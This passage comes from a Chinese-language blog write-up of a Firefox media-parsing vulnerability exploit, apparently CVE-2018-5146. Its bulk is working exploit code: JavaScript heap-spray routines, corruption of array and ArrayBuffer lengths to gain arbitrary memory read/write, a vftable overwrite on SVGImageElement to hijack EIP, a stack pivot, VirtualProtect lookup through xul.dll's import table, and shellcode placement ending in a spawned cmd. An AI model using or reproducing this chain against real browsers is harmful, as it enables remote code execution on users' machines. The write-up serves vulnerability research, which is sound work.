<td></td>
<td>……</td>
<td></td>
</tr>
<tr>
<td>地址</td>
<td>0x1140 0b54</td>
<td>Arraybuffer   数据</td>
</tr>
</tbody>
</table>
<p>arraybuffer 长度小的时候，arraybuffer的结构才是和数据才是相邻放置在内存中：</p>
<table>
<thead>
<tr>
<th><strong>地址</strong></th>
<th><strong>0x0712  4f50</strong></th>
<th><strong>Arraybuffer</strong>  <strong>头部结构</strong></th>
<th><strong>Arraybuffer**</strong>数据**</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>……</td>
<td>Arraybuffer  头部结构</td>
<td>Arraybuffer数据</td>
</tr>
</tbody>
</table>
<h4><span id="52-load-poc">5.2 load poc</span></h4><p>前面布置好array之后，就是使用poc了，代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> audio = <span class="built_in">document</span>.createElement(<span class="string">"audio"</span>);</span><br><span class="line"></span><br><span class="line">audio.src = <span class="string">"poc.ogg"</span>; </span><br><span class="line"></span><br><span class="line">audio.play();</span><br><span class="line"></span><br><span class="line">alert(<span class="string">"Attach the ogg file"</span>);</span><br></pre></td></tr></table></figure></p>
<p>我们可以通过创建标签audio的方式来加载poc。由于要触发漏洞函数，所以必须让poc加载之后就自动播放起来。</p>
<p>加载成功之后，可以在这里布置一个alert ，方便调试时候查看内存是否如预期把a[ ]的地址喷射成功。</p>
<h4><span id="53-寻找长长的array">5.3 寻找长长的array</span></h4><p>当前两步成功之后，也就是说由于a[ ] 溢出的数据，我们有一个被改动了长度的数组，这个数组的长度多长，由构造的poc里面的数据决定。起初，我想把这个长度尽量的改大，于是去修改poc里面的数据，但是发现a[ ] 溢出的部分的数据是通过一个浮点数的计算得到的，比较复杂，所以最终溢出的array长度确定为 0x31203e。</p>
<p> <img src="42.png" alt=""></p>
<p>那下面就是寻找这个超长的array的下标，这一步很简单，遍历数组，判断长度不等于0x3e，就是要找的array。这里要注意的是由于我们是交错释放了一半的array，寻找的时候就只能从这没有释放的一半开始。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//look for Out of bounds array</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">var</span> bounds_index = <span class="number">1</span> ; bounds_index &lt; bloack_size ; )</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((my_Array[bounds_index]).length != <span class="number">0x3e</span>)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">​    _Length = (my_Array[bounds_index]).length;</span><br><span class="line"></span><br><span class="line">​    _Index = bounds_index;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bounds_index =bounds_index+<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4><span id="54-另一个超长的数组">5.4 另一个超长的数组</span></h4><p>现在已经有了一个长度为0x31203e长度的数组了，但是它这个长度不够用。不能满足后面布置arraybuffer ，并进行搜索内存时的需求；所以需要另一个我们可以自定义长度的超长数组。</p>
<p>办法就是用0x31203e 数组去修改下一个数组的length结构。</p>
<p>怎么修改？</p>
<p>搜索内存，寻找下一个array 的数据开头，每一个array的开头我都赋值成了一个特殊的数据。找到数据头之后，前面的3个dword就是length的位置，改掉即可，比如是：0xffffff81。</p>
<p>这就有了一个非常长的array了，可以勉强算是做到全地址读的目的了。但是通过array 读取数据不是一个合理的选择，读取的非法值在js中会被修正成NaN。</p>
<p>所以这一步只是用来增加array的长度，方便对后面很远位置的内存进行操作。</p>
<p> <img src="43.png" alt=""></p>
<h4><span id="55-arraybuffer-喷洒">5.5 Arraybuffer 喷洒</span></h4><p>上一步说到array 用来读内存不合理，但是用arraybuffer是可以的，只要将arraybuffer初始化为dataview 就可以了。那么，怎么让arraybuffer来获得全内存读的目的呢？</p>
<p>这就要用到前面长度为0xffffff81 这个array。</p>
<p>思路：</p>
<p>1、 喷洒大量arraybuffer，每一个arraybuffer不要太长。</p>
<p>2、 用0xffffff81 的array 去修改某一个arraybuffer 的结构，包括长度，数据地址的指针等。让原本正常的arraybuffer 超长，数据地址指向其他位置。</p>
<p>3、 寻找超长的arraybuffer ，初始化为DataView ，达到全地址读。</p>
<p>到此，先提出几个问题：</p>
<p>1、 为什么需要0xffffff81 的array？</p>
<p>2、 Arraybuffer喷洒多大的数量？</p>
<p><strong>Answer 1</strong>：最开始已经有了一个长度为0x31203e的数组，但是我说它小了。因为我们这里喷洒arraybuffer的时候，没办法让arraybuffer 就分配在这个溢出array 的末尾，或者说与它相距不远的内存地址。而且，堆这个时候其他位置都不确定，可能在溢出array 之后就是个空白的一段地址。那寻找到这段地址的时候，就直接崩溃了；或者，另一种情况arraybuffer 被分配到很远的内存地址去，超过了 0x31203e 这个搜索的长度范围。</p>
<p><strong>Answer 2</strong>：为了方便说明，暂把 0xffffff81 这个array称为 array_81。首先要明白喷洒的arraybuffer 要便于array_81寻找。当 array_81根据下标去搜寻 arraybuffer 头与数据的时候，比如从下标为 0 开始，当下标为 0x43333 这个位置的时候，刚好这里是没有被使用的空白内存区域，没有任何数据，那搜寻到这里就崩溃了；这显然不满足要求。所以，必须让arraybuffer 能喷到一个相对比较稳定的地址，比如：0x1000 0000 – 0x1400 0000 这一段地址；所以arraybuffer的数量姑且取值为0x60000 ，每一个 arraybuffer长度取值为 0x20。</p>
<p>如下，赋特征值 0x67890000，便于寻找。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> my_Abuffer = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">var</span> Index = <span class="number">0</span> ; Index &lt; <span class="number">0x60000</span>; )</span><br><span class="line">&#123;</span><br><span class="line">  my_Abuffer[Index] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> U_32array = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(my_Abuffer[Index]);   </span><br><span class="line"></span><br><span class="line">  U_32array[<span class="number">0</span>] = <span class="number">0x67890000</span>;</span><br><span class="line"></span><br><span class="line">  U_32array[<span class="number">1</span>] = <span class="number">-127</span>;</span><br><span class="line"></span><br><span class="line">  U_32array[<span class="number">2</span>] = <span class="number">0x67890002</span>;</span><br><span class="line"></span><br><span class="line">  U_32array[<span class="number">3</span>] = <span class="number">-127</span>;</span><br><span class="line"></span><br><span class="line">  Index += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>另外，array_81开始搜索的下标不要从0开始，根据反复实验分析，array_81本身开始的地址有多部分的时候都分配在0x6000 0000-0xf000 0000之间，那么长度为从下标为0x400000 – 0xC00000 一段中取某个位置开始，这样就能大概率命中arraybuffer 所在的堆地址。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> j = <span class="number">0xc00000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer_base_address ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(( temp_array2[j] == <span class="number">0x67890000</span> ) &amp;&amp; ( temp_array2[j+<span class="number">1</span>] == <span class="number">0x67890002</span> ))</span><br><span class="line">  &#123;</span><br><span class="line">​    temp_array2[j] = <span class="number">0x10203040</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span>( temp_array2[j<span class="number">-3</span>] == <span class="number">0x00000020</span> )</span><br><span class="line">​    &#123;</span><br><span class="line">​      temp_array2[j<span class="number">-3</span>] = <span class="number">0x77777777</span>;</span><br><span class="line">​      <span class="keyword">break</span>;</span><br><span class="line">​    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  j++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4><span id="56-read-amp-write">5.6 Read &amp; Write</span></h4><p>当通过array修改到 arraybuffer的数据的时候，要改掉arraybuffer的长度，和数据地址的指针；然后，遍历申请的arraybuffer，找到这个特殊的buffer的下标，假设下标命名为 Abuffer_Index；用 Dataview初始化后，这就可以通过 getUint32，setUint32 方法来获得任意地址读写的能力。</p>
<p>查看内存，第一个红框就是数据指针，第二个就是数据的长度。如上面所说，结构+数据 放在一起的，且有个buffer的长度修改为 0x7777 7777 。</p>
<p> <img src="44.png" alt=""></p>
<p>找到这个0x7777 7777 的buffer，用Dataview初始化：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">** View 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> Abuffer_Index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">var</span> k = <span class="number">0</span> ; k &lt; <span class="number">0x60000</span> ; k++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>( my_Abuffer[k].byteLength != <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">​    Abuffer_Index = k;</span><br><span class="line">​    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Data_view1 = <span class="keyword">new</span> <span class="built_in">DataView</span>(my_Abuffer[Abuffer_Index]);</span><br></pre></td></tr></table></figure></p>
<h4><span id="57-jsobject">5.7 JSObject</span></h4><p>有了任意地址读写的能力，接下来就是想办法劫持eip，构造rop链。在这之前，先要构造jsobject，不然从哪里去劫持eip。</p>
<p>可以先参考：<a href="http://phrack.org/issues/69/14.html" target="_blank" rel="noopener">http://phrack.org/issues/69/14.html</a></p>
<p>开始的做法是 new function 对象，经过分析，虽然劫持到了eip，但是没办法控制esp；</p>
<p>之后换成了 <strong>createElementNS</strong> 对象与<strong>setAttribute</strong>方法。 </p>
<p>具体过程：</p>
<p>① <strong>New createElementNS</strong>，申请了大量的对象，赋特征值为0x12003400 是为了方便寻找。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">** object + aray</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> myArray2= <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span> ; i&lt;<span class="number">0x20000</span>;i=i+<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">  myArray2[i] = <span class="number">0x12003400</span>;</span><br><span class="line">  myArray2[i+<span class="number">1</span>] = <span class="string">"firefox"</span>+i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">2</span> ; i &lt; <span class="number">0x20000</span> ; i=i+<span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  myArray2[i] = <span class="built_in">document</span>.createElementNS(<span class="string">"xxxx"</span>，<span class="string">"image"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>② 搜索特征值，并泄露对象的地址指针；<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">** View 2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> leak_address;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>;;k=k+<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> tempDV = Data_view1.getUint32(k,<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> tempDV2 = Data_view1.getUint32(k+<span class="number">43</span>,<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> tempDV3 = Data_view1.getUint32(k+<span class="number">45</span>,<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">if</span>( tempDV == <span class="number">0x12003400</span> &amp;&amp; tempDV2 == <span class="number">0xffffff86</span> &amp;&amp; tempDV3 == <span class="number">0xffffff8c</span> )</span><br><span class="line">  &#123;</span><br><span class="line">​    leak_address = Data_view1.getUint32(k+<span class="number">44</span>,<span class="literal">true</span>);</span><br><span class="line">​    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p> <img src="45.png" alt=""></p>
<p>③ 泄露对象的指针之后，把这个指针 用<strong>Data_view1.setUint32</strong> 方法 ，放到相邻的一个<strong>arraybuffer</strong>数据地址指针的位置，并改动这个<strong>arraybuffer</strong> 的长度，再初始化为 <strong>Dataview</strong>，就做到对这个对象的任意位置读写。 </p>
<h4><span id="58-eip-control">5.8 eip control</span></h4><p>当对 <strong>createElementNS</strong> 任何位置都可以做到合法的读写时候，在某一个位置放着<strong>SVGImageElement’s  vftable</strong>的指针，修改这个指针为<strong>Data_view1</strong>上的某处，然后调用<strong>setAttribute</strong> 方法，<strong>eip</strong> 就会执行到被修改指针所指的位置去。</p>
<p><img src="46.png" alt=""></p>
<p>上图就是<strong>0xb22bd90</strong>本应该是<strong>SVGImageElement’s  vftable</strong>的指针, 被修改为：<strong>0x1115c770</strong> ；</p>
<p>然后调用 <strong>setAttribute</strong> 方法，这里会先去调用 <strong>SVGImageElement’s vftable</strong> 里面的<strong>BeforeSetAttr ，ParseAttribute</strong> 这两个函数：<br><img src="47.png" alt=""><br>那么先要获取到这两个位置的地址，放到<strong>0x1115c770 +1b0</strong> , <strong>0x1115c770 +1b8</strong> 的位置：</p>
<p> <img src="48.png" alt=""></p>
<p>当<strong>BeforeSetAttr</strong> ，<strong>ParseAttribute</strong> 这两个函数正常执行完之后，程序会来到 <strong>call eax</strong>的位置。</p>
<p>eax 的数据来源，分析可以知道是从 <strong>0x1115c770 + 200</strong> 的位置取得，这里就是控制eip的位置。</p>
<p> <img src="49.png" alt=""></p>
<h4><span id="59-leak-xuldll-amp-change-esp">5.9 leak xul.dll &amp; change esp</span></h4><p>Eip 被控制之后，先泄露 xul 的基地址，我使用了 <strong>xul!emptyElementsHeader+0x10</strong> 这个模块进行计算:</p>
<p> <img src="50.png" alt=""></p>
<p>然后用插件 <strong>mona</strong> 在xul 里搜索 <strong>xchg eax,esp</strong> 的指令，把eip 指向这条指令，执行之后 esp 就指向了eax 之前的位置。Eax 之前是什么位置呢？</p>
<p>在上一步控制eip 的时候，在汇编代码中实际上是 <strong>call [eax+200h] ,eax = 0x1115c770</strong>:</p>
<p>所以在 <strong>0x1115c770 + 200</strong> 填上 <strong>xchg eax, esp</strong> 的地址，就做到控制esp了：</p>
<p> <img src="51.png" alt=""></p>
<p>注意，<strong>esp</strong> 指向 <strong>0x1115c770</strong> ，然后<strong>eip</strong> 执行<strong>ret</strong> ，所以在<strong>0x1115c770</strong>开始放上 <strong>kernel! VritualProct</strong> 的地址和参数就可以了。</p>
<p> <img src="52.png" alt=""></p>
<h4><span id="510-leak-kernel32-amp-vritualproct">5.10 leak kernel32 &amp; VritualProct</span></h4><p>有了esp ，eip ，下面就是泄露 <strong>kernel32</strong> 的地址，得到 <strong>VritualProct</strong>函数。</p>
<p>因为泄露了 xul 的基地址，则是可以根据PE头，寻找导入表，然后找到kernel32的地址的。</p>
<p>1)  <strong>xul_BaseAddress = 0x5dfe0000</strong></p>
<p><img src="53.png" alt=""></p>
<p>2)  <strong>PE_offset = xul_BaseAddress + 0x3C</strong></p>
<p><img src="54.png" alt=""></p>
<p>3)  <strong>PE_address = PE_offset + xul_BaseAddress</strong></p>
<p><img src="55.png" alt=""></p>
<p>4)  <strong>Import_offset = PE_address + 0x80</strong>  </p>
<p><img src="56.png" alt=""></p>
<p>5)  <strong>Import_address = xul_BaseAddress + Import_offset</strong> </p>
<p><img src="57.png" alt=""></p>
<p>根据上图，得出最后导入表在内存的结构：</p>
<table>
<thead>
<tr>
<th>Dll函数名字的地址指针</th>
<th></th>
<th></th>
<th>Dll名字的地址指针</th>
<th>Dll 函数的地址指针</th>
</tr>
</thead>
<tbody>
<tr>
<td>xxxxxxxx</td>
<td>0000</td>
<td>0000</td>
<td>xxxxxxxx</td>
<td>xxxxxxxx</td>
</tr>
<tr>
<td>0x02d835b8</td>
<td>0000</td>
<td>0000</td>
<td>0x02d8b45c</td>
<td>0x026342c4</td>
</tr>
</tbody>
</table>
<p>比如：<strong>xul_BaseAddress + 0x02d8b45c = kernel32.dll</strong></p>
<p><img src="58.png" alt=""></p>
<p>Kernel32 中 <strong>VritualProct</strong> 函数名地址：<strong>Import_address + 0x02d835b8 + 0x1ec</strong> ，即偏移为<strong>0x1ec</strong>：</p>
<p><img src="59.png" alt=""></p>
<p>那<strong>Kernel32 !VritualProct</strong> 在内存的地址 = <strong>Import_address + 0x026342c4+ 0x1ec</strong></p>
<p><img src="60.png" alt=""></p>
<h4><span id="511-shellcode">5.11 Shellcode</span></h4><p>终于走到最后一步来了，前面什么都做好了。Esp 指向可控的堆区，堆被改为<strong>EXECUTE_READWRITE</strong> ，最后布置 <strong>shellcode</strong> 同样通过 <strong>Data_view1.setUnit32</strong> 进行写入就行:</p>
<p><img src="61.png" alt=""></p>
<p>0x1115c9f0 就是shellcode 开始的位置，已经有EXECUTE_READWRITE 的权限：</p>
<p><img src="62.png" alt=""></p>
<h3><span id="六-pop-cmd">六．     POP Cmd</span></h3><p>由于沙盒机制的存在，所以先关闭firefox的沙盒。</p>
<p>方法如下：<strong>about:config</strong></p>
<p><img src="63.png" alt=""></p>
<p>把这个 <strong>content.level</strong> 改为 0即可。</p>
<p>然后用xammp模拟一下http访问的情况，执行exp，弹出cmd。</p>
<p><img src="64.png" alt=""></p>
<h3><span id="七-final">七．     Final</span></h3><p>关于alert标签的问题。</p>
<p>执行exp的时候，执行的过程不第一定是从上到下执行。这样就会使搜索内存的代码会出现找不到相关特征值的情况，但是查看内存的时候堆喷确实也是成功喷到了。</p>
<p>那么，在测试阶段加上的alert标签去掉之后，就会出现exp执行不成功的问题。</p>
<p>Alert标签加上才成功，我有以下的猜想：alert影响了js引擎对代码的优化过程，主要是对for循环的优化。让网页的界面停在了alert标签的位置，js引擎就没有去优化后面代码，这样exp执行流程就是正确的。而去掉alert之后，由于优化问题，那么exp执行的先后顺序就不一样了。另一种想法：firefox好像能区分js代码中的dom部分与js部分，然后对这些进行异步执行，从而使执行流程出错。不过，最终的解决办法是通过setTimeout函数，对关键的部分进行延迟，这才使得整个流程从上到下能够完整的执行。</p>
</div><iframe src="/donate/?AliPayQR=null&amp;WeChatQR=/img/mePic.jpg&amp;GitHub=null&amp;BTCQR=null&amp;BTCKEY=null&amp;PayPal=null" style="overflow-x:hidden; overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe><div class="tags"><a href="/tags/漏洞利用/">漏洞利用</a></div><div class="post-nav"><a class="pre" href="/2022/07/30/730/">730</a><a class="next" href="/2022/02/24/2021总结/">2021总结</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'o3qEIvAEzJfA0jPzjvyVeUwo-gzGzoHsz',
  appKey:'VBV3VN2vtqwbGqHGFeNL86iw',
  placeholder:'thanks for you read',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="https://f01965.github.io"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2018/">CVE / 2018</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术分享/">技术分享</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/日志/">日志</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/技术分享/" style="font-size: 15px;">技术分享</a> <a href="/tags/漏洞利用/" style="font-size: 15px;">漏洞利用</a> <a href="/tags/CTF-web/" style="font-size: 15px;">CTF-web</a> <a href="/tags/固件/" style="font-size: 15px;">固件</a> <a href="/tags/机器学习框架/" style="font-size: 15px;">机器学习框架</a> <a href="/tags/win/" style="font-size: 15px;">win</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/GC/" style="font-size: 15px;">GC</a> <a href="/tags/Mircosoft/" style="font-size: 15px;">Mircosoft</a> <a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/漏洞分析/" style="font-size: 15px;">漏洞分析</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/技术分享-固件/" style="font-size: 15px;">技术分享/固件</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/11/25/glibc2-3-2-gcc3-4-5/">glibc2.3.2-gcc3.4.5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/20/Crack-a-software/">Crack a software</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/20/RV340/">RV340</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/17/winafl-net/">winafl-net</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/17/fuzz修改/">fuzz修改</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/30/730/">730</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/10/CVE-2018-5146/">CVE-2018-5146</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/24/2021总结/">2021总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/25/fortigate-Vulnerability/">fortigate Vulnerability</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/23/watchguard/">watchguard</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://yan-1-20.github.io/about/" title="Asprose" target="_blank">Asprose</a><ul></ul><a href="https://www.lucifaer.com/" title="Lucifaer" target="_blank">Lucifaer</a><ul></ul><a href="http://drac0nids.top/" title="Drac0nids" target="_blank">Drac0nids</a><ul></ul><a href="http://balis0ng.com/" title="balis0ng" target="_blank">balis0ng</a><ul></ul><a href="https://da7uran0ir.github.io/" title="Da7ura_n0ir" target="_blank">Da7ura_n0ir</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"> Dad ， I will always love you.</div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" color="255,0,0" opacity="0.7" zIndex="-1" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>